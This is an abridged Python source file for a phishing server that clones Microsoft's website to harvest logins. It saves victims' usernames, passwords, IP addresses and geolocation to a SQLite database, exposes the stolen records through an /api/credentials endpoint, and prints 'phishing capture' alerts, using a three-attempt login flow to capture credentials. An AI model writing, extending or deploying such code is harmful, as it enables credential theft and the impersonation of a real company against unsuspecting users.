#!/usr/bin/env python3
"""
COMPLETE MICROSOFT WEBSITE CLONE - WITH REALISTIC IMAGES
...
class Database:
    ...
    def save_credential(self, credential: Dict) -> int:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO credentials 
                (timestamp, ip, username, password, user_agent, attempt, is_valid, country, city, page_url, session_id)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                credential.get('timestamp', datetime.now().isoformat()),
                credential.get('ip', ''),
                credential.get('username', ''),
                credential.get('password', ''),
                credential.get('user_agent', ''),
                credential.get('attempt', 0),
                1 if credential.get('is_valid', False) else 0,
                credential.get('country', 'Unknown'),
                credential.get('city', 'Unknown'),
                credential.get('page_url', '/'),
                credential.get('session_id', '')
            ))
            conn.commit()
    ...
    def get_credentials(self, limit=100):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT ?', (limit,))
    ...
    def get_statistics(self):
        with sqlite3.connect(self.db_path) as conn:
            ...
            cursor.execute('SELECT COUNT(*) FROM credentials WHERE attempt >= 3')
            successful_logins = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM credentials WHERE is_valid = 1')
            valid_logins = cursor.fetchone()[0]
            cursor.execute('SELECT timestamp, username, attempt FROM credentials ORDER BY id DESC LIMIT 1')
            ...
            return {
                ...
                'last_username': last[1] if last else None,
                'last_attempt': last[2] if last else None
            }
...
class PhishingHandler(BaseHTTPRequestHandler):
    ...
    def do_GET(self):
        ...
        if path == "/" or path == "/home":
            ...
            self._send_json(200, {"status": "success", "data": stats})
        
        elif path == "/api/credentials":
            creds = self.db.get_credentials(100)
            self._send_json(200, {"status": "success", "data": {"credentials": creds, "total": self.db.get_credential_count()}})
    ...
    def _handle_login(self):
        try:
            ...
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            geo = self.geo_locator.get_location(client_ip)
            ...
            self.db.save_credential(credential)
            
            print("\n" + "="*80)
            print("🚨 NEW LOGIN ATTEMPT CAPTURED!")
            print("="*80)
            ...
            print(f"  🔒 Status: {'✅ VALID USER' if is_valid else '🎣 PHISHING CAPTURE'}")
            print("="*80)
            print("")
            ...
            if is_valid:
                ...
                self.alert_system.show_alert(f"PHISHING CAPTURE: {username} (Attempt {attempt_count}/3)", "capture")
...
class PhishingServer:
    ...
    def start(self):
        try:
            ...
            print("\n" + "="*70)
            print("  🎣 COMPLETE MICROSOFT WEBSITE CLONE")
            ...
            print("     Attempt 3   → Login success (captures credentials)")
            print("="*70)
            print("\n  📱 PAGES:")
